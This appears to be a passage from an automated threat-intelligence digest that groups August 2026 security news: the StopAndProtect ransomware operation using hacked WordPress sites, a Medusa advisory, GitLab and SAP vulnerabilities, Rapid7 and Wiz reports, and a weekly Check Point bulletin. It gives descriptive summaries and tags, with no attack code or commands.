CATEGORIES AI Research 18 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 467 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 421 How To Guides 13 Ransomware 6 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 Thousands of Hacked WordPress Sites, One Operation: Unmasking StopAndProtect August 18, 2026 https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/ Research by: Jaromír Hořejší ( @JaromirHorejsi ) Key points StopAndProtect is a newly identified operation that combines file encryption with data theft. The criminals abuse thousands of hacked WordPress websites as their infrastructure – using them to spread the malware, control infected machines, and store stolen documents, screenshots, and activity logs (records created by malware to track its actions, progress, or status during execution). Operational security (OPSEC) failures by the developer exposed lots of files, including detailed infection logs from victims’ machines, screenshots from infected computers, and source code of tools the criminals use to mass-manage compromised websites. Internal logs reveal thousands of IP addresses affected by this operation, underscoring that this is not a small, isolated incident but a large-scale campaign that targets victims across many regions and networks, where most IPs belong to the US, Russia, and India. The operation doesn’t rely on a single piece of malware, but on a whole toolkit of criminal software working together – some components encrypt files, others silently steal documents or lock the screen, and another acts as a live chat between the attackers and their victims. Introduction We first noticed a ransomware family called StopAndProtect in the middle of May 2026. Further analysis of the infrastructure reveals that the infection chain starts with a ClickFix social-engineering technique, which prompts victims to execute a PowerShell command. This leads to two stages of additional downloaders and loaders written in .NET, followed by several main functional components, such as ransomware, SMB/USB worm, LockScreen, VBS spreader, chat utility and credential stealer. Although the name StopAndProtect was originally given to the ransomware component, we decided to call the whole operation StopAndProtect, as it does not deploy ransomware on all its victims. In many cases, the attackers silently exfiltrate lists of files and later specific files from the infected machines. All these stages collect telemetry and generate and upload logs, giving malware operators a detailed view of the progress of the infection on the affected machines. Malware operators use hacked WordPress sites as infrastructure to host malware stages, as C&C servers to pass commands, as well as the storage of logs exfiltrated from victims. Due to their carelessness and not following proper operational security measures, we discovered a PHP script exposing a directory listing, which led to the discovery of even more log files and open directories. Parsing those logs can provide us with an overview of the size and magnitude of the overall operation. In one scenario, we suspect that the malware operator infected themselves and accidentally uploaded some of their desktop files to the collection server. This archive contains the source code of an automation tool for managing injected payloads at scale on compromised WordPress sites. It also contains a few text files listing close to 2,000 compromised WordPress domains, giving us a hint about the size of the operation. There are many vulnerable WordPress websites simply because their owners do not keep them updated. This is true not only for WordPress itself but also for installed plugins. Out of curiosity, we scanned one compromised WordPress website and found that it was running a Wo
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: Thousands of Hacked WordPress Sites, One Operation: Unmasking StopAndProtect
  - Published: 2026-08-18T13:05:44+00:00
  - Link: https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/
  - Summary: Research by: Jaromír Hořejší (@JaromirHorejsi) Key points Introduction We first noticed a ransomware family called StopAndProtect in the middle of May 2026. Further analysis of the infrastructure reveals that the infection chain starts with a ClickFix social-engineering technique, which prompts victims to execute a PowerShell command. This leads to two stages of additional downloaders and […] The post Thousands of Hacked WordPress Sites, One Operation: Unmasking StopAndProtect appeared first on Check Point Research .

### Cluster 396e9da871 — score 12

- Title: New Report: AI threats are here. Why Q2 2026 signals the end of traditional patch cycles
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-08-18T12:49:46+00:00
- Link: https://www.rapid7.com/blog/post/tr-new-report-ai-threats-q2-2026-ends-traditional-patch-cycles
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, vulnerability_disclosure
- affected_industries: critical_infrastructure, financial_services, government, healthcare
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, apt_espionage, vulnerability_disclosure
- affected_industries: healthcare, financial_services, government, critical_infrastructure
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
You can’t patch everything. So what do you fix first? Findings in Q2 2026 have changed traditional answers. The latest Quarterly Threat Landscape Report from Rapid7 Labs shows vulnerability disclosures still surging while attackers use automation and AI-assisted tooling to compress the time between disclosure and exploitation. The gap that patch cycles were built to fill is closing. Speed and volume are overwhelming security teams that have relied on traditional patch cycles and reactive programs. Success going forward can’t be about patching as much as possible - it has to be about understanding what matters most and reducing the exposures attackers can actually reach. Here are the four trends that defined Q2 2026, and what they mean for your security program as you define priorities for Q3 and beyond: The volume of disclosures hit another milestone There were 8,539 new high- and critical-severity CVEs (CVSS 7.0–10.0) this quarter- double the number reported in the same quarter last y
```

#### Full body

```
Back to Blog Threat Research New Report: AI threats are here. Why Q2 2026 signals the end of traditional patch cycles Rapid7 Labs Aug 18, 2026 | Last updated on Aug 18, 2026 | 3 min read DOWNLOAD THE REPORT You can’t patch everything. So what do you fix first? Findings in Q2 2026 have changed traditional answers. The latest Quarterly Threat Landscape Report from Rapid7 Labs shows vulnerability disclosures still surging while attackers use automation and AI-assisted tooling to compress the time between disclosure and exploitation. The gap that patch cycles were built to fill is closing. Speed and volume are overwhelming security teams that have relied on traditional patch cycles and reactive programs. Success going forward can’t be about patching as much as possible - it has to be about understanding what matters most and reducing the exposures attackers can actually reach. Here are the four trends that defined Q2 2026, and what they mean for your security program as you define priorities for Q3 and beyond: The volume of disclosures hit another milestone There were 8,539 new high- and critical-severity CVEs (CVSS 7.0–10.0) this quarter- double the number reported in the same quarter last year (4,268). Meanwhile, the number of newly exploited vulnerabilities held roughly steady (40). The takeaway isn’t that exploitation exploded - it’s that disclosure volume is far outstripping what any team can triage. The report breaks down which of those disclosures are actually reachable and how to triage by exploitability instead of severity score alone. Initial access keeps getting easier Nearly two-thirds of exploited vulnerabilities this quarter (62%) required no user interaction - no stolen credentials, no phishing victim, no click. Attackers reach and exploit them on their own, and that share is up nine points year over year (from 53% in Q2 2025). Reinforcing the trend, disclosures of missing-authentication flaws (CWE-306) surged 247% year over year - a fast-expanding pool of internet-facing systems that require no login at all. This is the quarter’s clearest signal - and the report details exactly which exposures to close first, and how, before the exploitation curve catches up. Nation-state activity remains persistent Rapid7 observed continued activity from Iranian, North Korean, and Russian advanced persistent threat (APT) clusters targeting government, finance, healthcare, manufacturing, energy, and telecommunications. Russian campaigns targeted edge infrastructure; Iranian activity included sustained industrial control system (ICS) and operational technology (OT) targeting. The report maps the specific techniques and sectors each cluster focused on this quarter. Ransomware stays concentrated but keeps evolving Qilin led ransomware activity in Q2 with 263 listed victims, and the United States remained the most heavily targeted country - with business services and healthcare among the hardest-hit sectors. Rapid7’s Incident Response team also saw growing use of ClickFix and fake CAPTCHA campaigns, and social engineering through trusted collaboration platforms like Microsoft Teams - techniques that accounted for 31.8% of the incidents we worked. The report includes the full ransomware leaderboard, the sectors most at risk, and where affiliate activity is expanding next. Exposure is the real challenge, and the biggest opportunity The volume is daunting, but the real challenge is keeping pace with attackers. As disclosures keep growing, the organizations that stay ahead won’t be the ones patching fastest — they’ll be the ones that know what they expose, which assets matter most, where attackers can realistically get in, and how to reduce reachable exposure before it becomes an incident. That’s what preemptive security means: not a slogan, but an operating model. The full Quarterly Threat Landscape Report shows where reachable exposure concentrates this quarter, the four actions Rapid7 Labs recommends, the sector-by-sector breakdown, and
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: New Report: AI threats are here. Why Q2 2026 signals the end of traditional patch cycles
  - Published: 2026-08-18T12:49:46+00:00
  - Link: https://www.rapid7.com/blog/post/tr-new-report-ai-threats-q2-2026-ends-traditional-patch-cycles
  - Summary: You can’t patch everything. So what do you fix first? Findings in Q2 2026 have changed traditional answers. The latest Quarterly Threat Landscape Report from Rapid7 Labs shows vulnerability disclosures still surging while attackers use automation and AI-assisted tooling to compress the time between disclosure and exploitation. The gap that patch cycles were built to fill is closing. Speed and volume are overwhelming security teams that have relied on traditional patch cycles and reactive programs. Success going forward can’t be about patching as much as possible - it has to be about understanding what matters most and reducing the exposures attackers can actually reach. Here are the four trends that defined Q2 2026, and what they mean for your security program as you define priorities for Q3 and beyond: The volume of disclosures hit another milestone There were 8,539 new high- and critical-severity CVEs (CVSS 7.0–10.0) this quarter- double the number reported in the same quarter last y

### Cluster d9890362d0 — score 12

- Title: Closing the Blind Spot: Securing Personal Repositories in the Software Supply Chain
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-08-13T13:48:56+00:00
- Link: https://www.wiz.io/blog/securing-personal-repositories
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Personal repositories are where corporate secrets quietly escape. Wiz correlates them to your developers, validates the real risk, and drives the fix.
```

#### Full body

```
Wiz Pricing Get a demo Get a demo Most application security programs assume a clean boundary. Your code lives in your organization's repositories, your identity provider governs who touches it, and controls like branch protections and secret scanning are applied inside that boundary. The reality is that developers don’t work that way. The same engineer who pushes to code to a GitHub Enterprise organization by day maintains side projects, forks, and experiments under a personal account by night. These are often the same GitHub account, toggling between an org context you control and a personal one you don't. When corporate code or a credential gets copied into a personal public repo, usually by accident and in a hurry, it creates a blindspot for risk, one larger than most teams realize. Wiz Research found verified secret leaks in 65% of the Forbes AI 50, and 56% of company-impacting secrets lived in employees' personal repositories , where most security programs have no visibility. Closing this gap is what Wiz does by correlating your developers with the personal public repositories they own, validating which exposed secrets are actually exploitable, and driving them to a tracked fix. In this post, we'll explain why this problem is accelerating, why traditional secret scanning can't solve it, and how identity-driven correlation changes the way AppSec teams manage secret exposure. The Threat Landscape: Why Attackers Target Public Repos Threat actors perform automated reconnaissance using bots that monitor public commits on GitHub in near real time. When a secret appears in a public repo, it can be picked up in minutes, sometimes seconds, and used immediately. But raw exposure volume understates the danger, because not every leaked string is a live risk. What matters is which secrets are validated —confirmed active and usable at the time of discovery. In our State of SDLC 2026 report, we found validated secrets found in public repositories frequently provide infrastructure-level access rather than application-only access: cloud provider credentials, CI/CD tokens, third-party API keys, and AI service credentials. In other words, a leaked key of this kind isn't a door into one app, it's a door into the infrastructure behind it. Two forces are accelerating this risk. AI-assisted development : AI increases code volume, reuse, and automated change propagation, which lets existing secrets spread faster and farther across development environments than teams can review them. Novel risk from newer AI platforms: These platforms are young, but their credentials already leak at a rate disproportionate to the ecosystem's age— four of the top five most frequently leaked validated secrets are for AI services, because coding assistants optimize for velocity and velocity is where security review gets skipped. Why Scanning Alone Doesn't Close the Gap While traditional approaches to Secret Scanning are a good baseline form of defense, it doesn’t address the two things that make personal-repo exposure dangerous. Secret scanning doesn’t see outside enterprise boundaries : As we’ve discussed, personal repositories are an invisible risk for organizations. A developer's personal public repo isn't org-owned, so it never enters inventory. You can't scan an asset you don't know exists. Detected secrets don’t always map to exploitable attack paths : A detector produces a string match, not a risk. Is the secret still valid? Does it grant access to anything real? Knowing a secret is present is not the same as knowing it is live, and knowing it is live is not the same as knowing what it can reach. The challenge isn't finding more secrets. Personal repository scanning often uncovers plenty. The challenge is knowing which ones actually matter. Without context, thousands of exposed secrets become just another backlog. By connecting exposed secrets back to your organization and enriching them with cloud, identity, and runtime context, security teams can prioritize
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Closing the Blind Spot: Securing Personal Repositories in the Software Supply Chain
  - Published: 2026-08-13T13:48:56+00:00
  - Link: https://www.wiz.io/blog/securing-personal-repositories
  - Summary: Personal repositories are where corporate secrets quietly escape. Wiz correlates them to your developers, validates the real risk, and drives the fix.

### Cluster c7e8884f67 — score 12

- Title: Medusa ransomware tallies hundreds of new victims, says updated advisory on group’s tactics
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-08-18T17:18:58+00:00
- Link: https://cyberscoop.com/medusa-ransomware-tactics-cisa-advisory/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Medusa

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, vulnerability_disclosure, zero_day
- actor_attribution: Medusa
- affected_industries: critical_infrastructure, government, healthcare
- tools_used: OpenAI/ChatGPT
- urgency_signals: no_patch_yet, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, vulnerability_disclosure
- actor_attribution: Medusa
- affected_industries: healthcare, government, critical_infrastructure
- tools_used: OpenAI/ChatGPT
- urgency_signals: zero_day, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
The updated warning from the FBI, CISA and HHS draws on a year’s worth of investigations to detail how the group gains initial access and what it does afterward. The post Medusa ransomware tallies hundreds of new victims, says updated advisory on group’s tactics appeared first on CyberScoop .
```

#### Full body

```
Advertisement Get our latest cybersecurity news first on Google. Click here! Close The ransomware-as-a-service group Medusa has adopted fresh tactics to gain access and added hundreds of victims in a little more than a year, according to an updated U.S. government advisory published Tuesday. The gang is relying on access brokers,compensating them anywhere from $100 to $1 million, with higher prices going to those who work exclusively with Medusa. However, most of the brokers work simultaneously for “multiple variants at the same time,” the advisory from the Cybersecurity and Infrastructure Security Agency, FBI and Health and Human Services Department states in one of the updated portions of the advisory. Tuesday’s update advisory expands upon aMarch 2025 advisory, drawing on ongoing FBI investigations.nIt includes information on the kinds of software vulnerabilities Medusa has exploited, such as Fortra GoAnywhere and BeyondTrust flaws. “Medusa actors operate opportunistically by targeting victims with unpatched software rather than focusing on specific organizations or sectors; however, the Healthcare and Public Health (HPH) Sector has been a frequent victim of Medusa operations,” according to the advisory. “Medusa actors leverage newly announced exploits within 24 hours and have been observed to use exploits up to a week before public vulnerability disclosure.’ Advertisement “However, there is no indication Medusa actors develop their own zero-day or N-day vulnerabilities, preferring instead to obtain advanced access to exploits from unknown sources or to quickly leverage newly announced exploits before potential victims can mitigate vulnerabilities through patching,” the advisory continues. The approach appears to be netting gains: From March 2025 to April of this year, the victim tally in the advisory jumped from more than 300 to more than 500. The group was first identified in 2021. “Medusa actors often use legitimate tools and living off the land techniques to evade detection. They may also leverage remote monitoring and management software and remote access services, including Remote Desktop Protocol, for lateral movement,” as updated sections of the advisory detail. “Once inside a network, they use common utilities and tools to support credential access, data exfiltration, and ransomware deployment.” Earlier this year, Microsoft detailed how a group it dubbed Storm-1175 was making use of Medusa ransomware in speedy operations. Symantec and Carbon Black also detailed earlier this year how North Korean hackers were leaning on Medusa to target the health care sector. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Advertisement More Scoops The headquarters of the Federal Bureau of Investigation on August 16, 2022, in Washington. (Matt McClain/The Washington Post via Getty Images) (Getty Images) A sign is seen at Microsoft headquarters on July 3, 2024, in Redmond, Washington. (David Ryder/Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity The world still treats bug hunters like criminals The SOC wasn’t built for this Why Cybersecurity is at the heart of the US-China AI race Government Irregular says ‘human oversight’ responsible for AI sandbox escape incidents A bold new strategy or a dangerous precedent? Experts are divided on Trump's memo. Trump turns to private sector in offensive hacking operations memo Federal judge issues second order blocking Trump mail-in voting directive Technology AI’s ‘middle class’ has gotten dramatically better at hacking The FTC wants to regulate AI for ideological bias OpenAI says Daybreak will expand to offer specialized cyber services More than half of AI-generated patches are broken Threats Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan Kimwolf botnet rebuilt to survive takedowns, researchers say Delta investigates in-flight Wi-Fi spoofing on post-DEF CON flight from Las V
```

#### Corroborating sources (2)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Medusa ransomware tallies hundreds of new victims, says updated advisory on group’s tactics
  - Published: 2026-08-18T17:18:58+00:00
  - Link: https://cyberscoop.com/medusa-ransomware-tactics-cisa-advisory/
  - Summary: The updated warning from the FBI, CISA and HHS draws on a year’s worth of investigations to detail how the group gains initial access and what it does afterward. The post Medusa ransomware tallies hundreds of new victims, says updated advisory on group’s tactics appeared first on CyberScoop .
- **The Record** (cyber_news_breach_reporting)
  - Title: More than 200 victims of Medusa ransomware identified over the last year, CISA says
  - Published: 2026-08-18T18:05:00+00:00
  - Link: https://therecord.media/more-than-200-medusa-ransomware-victims-in-last-year-cisa
  - Summary: The Cybersecurity and Infrastructure Security Agency (CISA) and FBI updated an advisory on the group initially released in March 2025 — writing that as of April 2026, Medusa actors have hit more than 500 victims. CISA previously said 300 victims, many of which are in critical infrastructure sectors, were attacked as of 2025.

### Cluster 87a0c02b73 — score 12

- Title: Critical GitLab flaw allows attackers to modify or delete public projects (CVE-2026-19478)
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-08-18T11:38:24+00:00
- Link: https://www.helpnetsecurity.com/2026/08/18/gitlab-critical-code-injection-flaw-cve-2026-19478/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: CVE-2026-19478, GitLab

#### Cluster taxonomy (union across members)
- affected_products: GitLab
- cve_ids: CVE-2026-19478, CVE-2026-19650
- urgency_signals: critical_cvss, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_products: GitLab
- cve_ids: CVE-2026-19478, CVE-2026-19650
- urgency_signals: preauth_unauth, critical_cvss
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
GitLab has released patches for two vulnerabilities, including a critical-severity code injection flaw that can be exploited without authentication. The vulnerabilities affect GitLab Community Edition (CE) and Enterprise Edition (EE) versions from 18.2 before 18.11.11, 19.0 before 19.0.8, 19.1 before 19.1.6, and 19.2 before 19.2.4. The fixes are available in GitLab 19.2.4, 19.1.6, 19.0.8, and 18.11.11. “These versions contain important bug and security fixes, and we strongly recommend that all self-managed GitLab installations be upgraded … More → The post Critical GitLab flaw allows attackers to modify or delete public projects (CVE-2026-19478) appeared first on Help Net Security .
```

#### Full body

```
Sinisa Markovic , Managing Editor, Help Net Security August 18, 2026 Share Critical GitLab flaw allows attackers to modify or delete public projects (CVE-2026-19478) GitLab has released patches for two vulnerabilities, including a critical-severity code injection flaw that can be exploited without authentication. The vulnerabilities affect GitLab Community Edition (CE) and Enterprise Edition (EE) versions from 18.2 before 18.11.11, 19.0 before 19.0.8, 19.1 before 19.1.6, and 19.2 before 19.2.4. The fixes are available in GitLab 19.2.4, 19.1.6, 19.0.8, and 18.11.11. “These versions contain important bug and security fixes, and we strongly recommend that all self-managed GitLab installations be upgraded to one of these versions immediately,” the company said. “GitLab.com and GitLab Dedicated are already running the patched version. GitLab.com and GitLab Dedicated customers do not need to take action,” they added. The more severe vulnerability , CVE-2026-19478 (CVSS 9.4), involves code injection through a GraphQL directive and can be exploited remotely by an unauthenticated attacker without user interaction. Successful exploitation could allow an attacker to modify or delete public projects and user data. The second vulnerability, CVE-2026-19650 (CVSS 7.1), is a cross-site request forgery issue in the GraphQL multiplex query handler. Improper request validation could allow an unauthenticated attacker to “execute mutations via GET requests,” though exploitation requires user interaction. “We are committed to ensuring that all aspects of GitLab that are exposed to customers or that host customer data are held to the highest security standards,” the company concluded . Both vulnerabilities were reported through GitLab’s HackerOne bug bounty program . More about CVE GitLab vulnerability Share
```

#### Corroborating sources (4)

- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Critical GitLab flaw allows attackers to modify or delete public projects (CVE-2026-19478)
  - Published: 2026-08-18T11:38:24+00:00
  - Link: https://www.helpnetsecurity.com/2026/08/18/gitlab-critical-code-injection-flaw-cve-2026-19478/
  - Summary: GitLab has released patches for two vulnerabilities, including a critical-severity code injection flaw that can be exploited without authentication. The vulnerabilities affect GitLab Community Edition (CE) and Enterprise Edition (EE) versions from 18.2 before 18.11.11, 19.0 before 19.0.8, 19.1 before 19.1.6, and 19.2 before 19.2.4. The fixes are available in GitLab 19.2.4, 19.1.6, 19.0.8, and 18.11.11. “These versions contain important bug and security fixes, and we strongly recommend that all self-managed GitLab installations be upgraded … More → The post Critical GitLab flaw allows attackers to modify or delete public projects (CVE-2026-19478) appeared first on Help Net Security .
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: GitLab Patches Critical Code Injection Vulnerability
  - Published: 2026-08-18T08:51:07+00:00
  - Link: https://www.securityweek.com/gitlab-patches-critical-code-injection-vulnerability/
  - Summary: The security defect allows unauthenticated attackers to modify or delete user data and public projects. The post GitLab Patches Critical Code Injection Vulnerability appeared first on SecurityWeek .
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Critical GitLab Zero-Click Flaw Poses Mitigation Challenges
  - Published: 2026-08-18T21:25:58+00:00
  - Link: https://www.darkreading.com/application-security/critical-gitlab-zero-click-flaw-mitigation-challenges
  - Summary: A lack of technical details could make it hard for organizations running self-managed GitLab versions to detect potential exploitation of CVE-2026-19478.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical GitLab GraphQL Flaw Could Let Unauthenticated Attackers Delete Public Projects
  - Published: 2026-08-17T21:03:04+00:00
  - Link: https://thehackernews.com/2026/08/critical-gitlab-graphql-flaw-could-let.html
  - Summary: GitLab has released security updates to address a critical vulnerability impacting its Community Edition (CE) and Enterprise Edition (EE) software that, under certain conditions, could allow an unauthenticated attacker to remotely modify or delete public projects and user data. The flaw, tracked as CVE-2026-19478, has been rated Critical by GitLab and assigned a CVSS score of 9.4. Released on

### Cluster a50e916d10 — score 12

- Title: SAP Commerce Cloud CVE-2026-58231 Targeted in Exploitation Attempts Days After Patch
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-15T08:38:46+00:00
- Link: https://thehackernews.com/2026/08/sap-commerce-cloud-cve-2026-58231.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 1
- Strong signals: CVE-2026-58231

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, credential_theft, web_shell_backdoor
- actor_attribution: UNC5174, UNC5221
- affected_industries: telecommunications
- affected_products: Anthropic/Claude, Apple iOS/macOS, Azure
- cve_ids: CVE-2025-31324, CVE-2026-58231
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft, apt_espionage, web_shell_backdoor
- actor_attribution: UNC5221, UNC5174
- affected_industries: telecommunications
- affected_products: Apple iOS/macOS, Anthropic/Claude, Azure
- cve_ids: CVE-2026-58231, CVE-2025-31324
- urgency_signals: preauth_unauth, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
A maximum-severity security vulnerability impacting SAP Commerce Cloud is witnessing active exploitation efforts. The vulnerability, tracked as CVE-2026-58231, is rated 10.0 on the CVSS scoring system. It relates to an instance of insufficient authorization checks and input validation. "SAP Commerce Cloud allows an unauthenticated attacker to abuse a default authentication client and submit
```

#### Full body

```
SAP Commerce Cloud CVE-2026-58231 Targeted in Exploitation Attempts Days After Patch  Ravie Lakshmanan  Aug 15, 2026 Vulnerability / Cloud Security A maximum-severity security vulnerability impacting SAP Commerce Cloud is witnessing active exploitation efforts. The vulnerability, tracked as CVE-2026-58231 , is rated 10.0 on the CVSS scoring system. It relates to an instance of insufficient authorization checks and input validation. "SAP Commerce Cloud allows an unauthenticated attacker to abuse a default authentication client and submit specially crafted input to certain functions lacking sufficient validation," per CVE.org. "Successful exploitation could enable arbitrary code execution and compromise internal components, resulting in high impact on confidentiality, integrity, and availability of the application." According to Defused Cyber, exploitation attempts against CVE-2026-58231 began to hit its honeypot systems merely three days after the release of the patch. "This vulnerability has no public PoC and is not known to be exploited," the threat intelligence company said in an X post shared on Friday. SAP security company Onapsis noted earlier this week that successful exploitation of CVE-2026-58231 could permit arbitrary code execution and compromise internal components. "Customers must patch to the fixed Commerce Cloud release levels referenced in the note and re-build/re-deploy the updated SAP Commerce Cloud version," it said. "As a temporary workaround, customers can reduce their exposure by configuring an IP Filter Set in SAP Commerce Cloud to restrict access to the vulnerable endpoint." There are currently no details available on who is behind the exploitation efforts targeting the flaw. However, prior flaws (CVE-2025-31324) impacting SAP products, including NetWeaver, have been weaponized by China-nexus espionage clusters like UNC5221, UNC5174, and CL-STA-0048, as well as cybercrime groups such as BianLian and RansomExx . In April 2025, unknown threat actors were also observed exploiting the same critical SAP NetWeaver vulnerability to deploy a backdoor called Auto-Color in an attack aimed at a U.S.-based chemicals company. Update KEVIntel has also independently confirmed seeing exploitation efforts against CVE-2026-58231, with two attempts detected on August 14 from a lone IP address located in the U.S. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Cloud security , Cyber Attack , enterprise security , exploit , Patch Management , remote code execution , SAP , Threat Intelligence , Vulnerability ⚡ Top Stories This Week Azure Cosmos DB Flaw Exposed Platform-Wide Key That Could Access Any Database Anthropic Says Claude Mistook the Open Internet for a CTF and Breached Three Organizations Researchers Report 84 Flaws in 4G and 5G Cores, Including a Session Hijacking Flaw Cheap Android TV Boxes Pose as Phones and Turn Owners’ Broadband Into Proxies N-able Says Attackers Take Over N-central Servers After Initial Fix Proves Incomplete Google Password Manager Attacks Could Let Malware Hijack Passkey-Protected Accounts New cPanel Critical Flaw Could Let Hosting Customers Run SQL as Database Root Keyv-Linked npm Worm Poisons Hundreds of Packages, Plants Claude Code and VS Code Hooks Claude Mythos 5 Tried to Backdoor a Real Open-Source Project in Testing, Then Vouched for Itself Critical Gitea Flaw Let Unauthenticated Attackers Read Server Files via Org-Mode Markup Poison Claude Sells Discounted Claude Access While Its Operator Sees Every Customer Prompt Over 250 ClickFix Domains Use Browser Fingerprinting to Hide macOS Malware Lures Chinese-Made Zbtlink Routers Ship With Backdoor That Opens Unauthenticated Root Shells Apple iCloud Private Relay Can Expose Real IPs Through WebKit Proxy Bypasses ThreatsDay: Odysseus RCE, Samsung One-Click Takeover, iCloud Backdoor Fight + 27 Mo
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: SAP Commerce Cloud CVE-2026-58231 Targeted in Exploitation Attempts Days After Patch
  - Published: 2026-08-15T08:38:46+00:00
  - Link: https://thehackernews.com/2026/08/sap-commerce-cloud-cve-2026-58231.html
  - Summary: A maximum-severity security vulnerability impacting SAP Commerce Cloud is witnessing active exploitation efforts. The vulnerability, tracked as CVE-2026-58231, is rated 10.0 on the CVSS scoring system. It relates to an instance of insufficient authorization checks and input validation. "SAP Commerce Cloud allows an unauthenticated attacker to abuse a default authentication client and submit

### Cluster 7e142768f0 — score 10

- Title: 17th August – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-08-17T13:37:34+00:00
- Link: https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, phishing_social_eng, ransomware_extortion
- actor_attribution: Kimsuky
- affected_industries: critical_infrastructure, financial_services, government, healthcare
- affected_products: Apple iOS/macOS, Microsoft 365, Microsoft SharePoint
- cve_ids: CVE-2026-53413, CVE-2026-65400, CVE-2026-68820, CVE-2026-71362
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, data_breach, active_exploitation
- actor_attribution: Kimsuky
- affected_industries: healthcare, financial_services, government, critical_infrastructure
- affected_products: Microsoft 365, Apple iOS/macOS, Microsoft SharePoint
- cve_ids: CVE-2026-68820, CVE-2026-65400, CVE-2026-71362, CVE-2026-53413
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 17th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Colombia’s Ministry of Justice has experienced a ransomware attack that affected part of its technology infrastructure and disrupted public services related to illicit-drug monitoring and legal processes. Officials confirmed that some files were […] The post 17th August – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 17th August – Threat Intelligence Report August 17, 2026 https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 17th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Colombia’s Ministry of Justice has experienced a ransomware attack that affected part of its technology infrastructure and disrupted public services related to illicit-drug monitoring and legal processes. Officials confirmed that some files were encrypted but stated that no data theft was detected during the incident. MyDr, Poland’s primary healthcare platform for appointments, medical records, and prescriptions, has suffered a data breach potentially affecting nearly 19 million citizens. Attackers claimed to hold 2.5TB of information and shared a senior politician’s identification details, phone numbers, and prescriptions as evidence of the compromise. Levi Strauss & Co., the global American apparel company, has reported a cyberattack after attackers used social engineering to compromise three employee devices and steal corporate information. According to the firm, preliminary findings indicate no consumer data was accessed or copied. The company notified affected individuals and relevant regulators. IEH Corporation, a US defense and aerospace component manufacturer, has confirmed a phishing compromise of an employee’s Microsoft 365 mailbox. Attackers used a fraudulent document-sharing link to steal credentials, potentially exposing customer communications, purchase orders, engineering documents, and export-controlled technical information. AI THREATS Researchers detailed a suspected China-linked campaign that used autonomous AI agents against Taiwanese government systems. The operation reportedly mapped 21 systems, compromised 85 accounts, and obtained 2,500 personnel records before expanding toward a nuclear safety organization and seven companies in the energy sector. Researchers outlined how North Korea-linked Kimsuky is building an offline AI environment to support phishing, intelligence analysis, and malware development. The setup combines locally hosted language models with document retrieval, code resources, and transcription capabilities, potentially allowing operators 